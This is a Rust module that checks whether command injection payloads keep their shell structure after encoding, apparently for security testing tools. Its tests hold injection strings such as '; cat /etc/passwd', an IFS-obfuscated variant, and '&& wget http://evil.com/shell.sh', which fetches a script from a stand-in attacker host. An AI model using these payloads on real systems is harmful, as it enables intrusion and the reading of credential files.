//! Command injection payload oracle.
//!
//! Command injection payloads require three structural elements:
//! 1. **A separator** — `;`, `|`, `&&`, `||`, `` ` ``, `$()` that breaks out of the original command
//! 2. **A command** — actual executable to run (`cat`, `whoami`, `id`, `curl`, etc.)
//! 3. **Optional arguments** — file paths, URLs, flags
//!
//! If encoding destroys any separator or the command name, the payload
//! becomes inert text that the shell will reject or ignore.

use crate::traits::PayloadOracle;
use serde::Deserialize;
use std::sync::OnceLock;

/// Command injection oracle that validates shell command structure preservation.
pub struct CmdiOracle;

// ──────────────────────────────────────────────
//  TOML-loaded CMDI oracle rules
// ──────────────────────────────────────────────

/// Compile-time embedded TOML rules for CMDI oracle.
const CMD_ORACLE_TOML: &str = include_str!("../rules/cmd/oracle.toml");

/// Command separator definition from TOML.
#[derive(Debug, Clone, Deserialize)]
struct CmdSeparator {
    pattern: String,
    #[allow(dead_code)]
    description: String,
}

/// Shell command definition from TOML.
#[derive(Debug, Clone, Deserialize)]
struct ShellCommand {
    name: String,
    #[allow(dead_code)]
    description: String,
}

/// Shell trick definition from TOML.
#[derive(Debug, Clone, Deserialize)]
struct ShellTrick {
    pattern: String,
    #[allow(dead_code)]
    description: String,
}

/// Root structure for oracle.toml.
#[derive(Debug, Clone, Deserialize)]
struct CmdOracleRules {
    #[serde(default)]
    cmd_separator: Vec<CmdSeparator>,
    #[serde(default)]
    shell_command: Vec<ShellCommand>,
    #[serde(default)]
    shell_trick: Vec<ShellTrick>,
}

/// Parse the embedded TOML rules once at first access.
fn get_rules() -> &'static CmdOracleRules {
    static RULES: OnceLock<CmdOracleRules> = OnceLock::new();
    RULES.get_or_init(|| {
        toml::from_str(CMD_ORACLE_TOML).unwrap_or_else(|_| {
            CmdOracleRules { cmd_separator: Vec::new(), shell_command: Vec::new(), shell_trick: Vec::new() }
        })
    })
}

/// Get command separators that break out of the current shell context.
fn cmd_separators() -> &'static [String] {
    static CACHE: OnceLock<Vec<String>> = OnceLock::new();
    CACHE.get_or_init(|| {
        get_rules()
            .cmd_separator
            .iter()
            .map(|s| s.pattern.clone())
            .collect()
    })
}

/// Get common commands used in injection payloads.
fn shell_commands() -> &'static [String] {
    static CACHE: OnceLock<Vec<String>> = OnceLock::new();
    CACHE.get_or_init(|| {
        get_rules()
            .shell_command
            .iter()
            .map(|c| c.name.clone())
            .collect()
    })
}

/// Get shell variable substitution and IFS tricks.
fn shell_tricks() -> &'static [String] {
    static CACHE: OnceLock<Vec<String>> = OnceLock::new();
    CACHE.get_or_init(|| {
        get_rules()
            .shell_trick
            .iter()
            .map(|t| t.pattern.clone())
            .collect()
    })
}

/// Returns true if `text` contains `word` as a whole word.
fn contains_word(text: &str, word: &str) -> bool {
    let text_lower = text.to_ascii_lowercase();
    let word_lower = word.to_ascii_lowercase();
    text_lower
        .split(|c: char| {
            c.is_ascii_whitespace()
                || matches!(
                    c,
                    ';' | '|' | '&' | '`' | '$' | '(' | ')' | '<' | '>' | '\'' | '"'
                )
                || c == '\0'
        })
        .any(|part| {
            let part = part.trim_start_matches('/');
            part == word_lower
                || part.starts_with(&word_lower)
                    && part[word_lower.len()..].starts_with(|c: char| {
                        c.is_ascii_whitespace() || c == '-' || c == '/' || c == '(' || c == '$'
                    })
        })
}

/// Checks whether a payload contains command injection structure.
fn has_cmdi_structure(payload: &str) -> bool {
    let payload = payload.trim_end_matches(['\0', '\u{FFFD}']);
    let lower = payload.to_ascii_lowercase();

    // Must have at least one separator
    let has_separator = cmd_separators().iter().any(|sep| payload.contains(sep));

    // Must reference at least one command as a whole word
    let has_command = shell_commands()
        .iter()
        .any(|cmd| contains_word(payload, cmd));

    // Shell tricks indicate structural complexity (separator is still required)
    let has_shell_trick = shell_tricks().iter().any(|trick| payload.contains(trick));

    // Also check for common target paths
    let has_target_path = lower.contains("/etc/passwd")
        || lower.contains("/etc/shadow")
        || lower.contains("/bin/")
        || lower.contains("/tmp/")
        || lower.contains("http://")
        || lower.contains("https://");

    // Valid CMDI: separator is always required. Then either a recognized
    // command, a shell trick, or a target path (like /etc/passwd) makes it structural.
    has_separator && (has_command || has_shell_trick || has_target_path)
}

impl PayloadOracle for CmdiOracle {
    fn is_semantically_valid(&self, _original: &str, transformed: &str) -> bool {
        has_cmdi_structure(transformed)
    }

    fn name(&self) -> &'static str {
        "CMDI"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn semicolon_cat_valid() {
        let oracle = CmdiOracle;
        assert!(oracle.is_semantically_valid("; cat /etc/passwd", "; cat /etc/passwd",));
    }

    #[test]
    fn pipe_ls_valid() {
        let oracle = CmdiOracle;
        assert!(oracle.is_semantically_valid("| ls -la", "| ls -la"));
    }

    #[test]
    fn double_ampersand_valid() {
        let oracle = CmdiOracle;
        assert!(oracle.is_semantically_valid(
            "&& wget http://evil.com/shell.sh",
            "&& wget http://evil.com/shell.sh",
        ));
    }

    #[test]
    fn backtick_subshell_valid() {
        let oracle = CmdiOracle;
        assert!(oracle.is_semantically_valid("`id`", "`id`"));
    }

    #[test]
    fn dollar_paren_subshell_valid() {
        let oracle = CmdiOracle;
        assert!(oracle.is_semantically_valid("$(whoami)", "$(whoami)"));
    }

    #[test]
    fn ifs_trick_valid() {
        let oracle = CmdiOracle;
        assert!(
            oracle.is_semantically_valid(
                ";${IFS}cat${IFS}/etc/passwd",
                ";${IFS}cat${IFS}/etc/passwd",
            )
        );
    }

    #[test]
    fn encoded_separator_invalid() {
        let oracle = CmdiOracle;
        // URL encoding destroyed the semicolon separator
        assert!(!oracle.is_semantically_valid("; cat /etc/passwd", "%3B cat /etc/passwd",));
    }

    #[test]
    fn encoded_command_still_valid() {
        let oracle = CmdiOracle;
        // Separator preserved, command still readable
        assert!(oracle.is_semantically_valid("; cat /etc/passwd", "; cat /etc/passwd",));
    }

    #[test]
    fn plain_text_invalid() {
        let oracle = CmdiOracle;
        assert!(!oracle.is_semantically_valid("; cat /etc/passwd", "hello world"));
    }

    #[test]
    fn empty_invalid() {
        let oracle = CmdiOracle;
        assert!(!oracle.is_semantically_valid("; cat /etc/passwd", ""));
    }

    #[test]
    fn newline_separator_valid() {
        let oracle = CmdiOracle;
        assert!(oracle.is_semantically_valid("\nid", "\nid",));
    }

    #[test]
    fn or_pipe_valid() {
        let oracle = CmdiOracle;
        assert!(oracle.is_semantically_valid("|| curl evil.com", "|| curl evil.com"));
    }
}
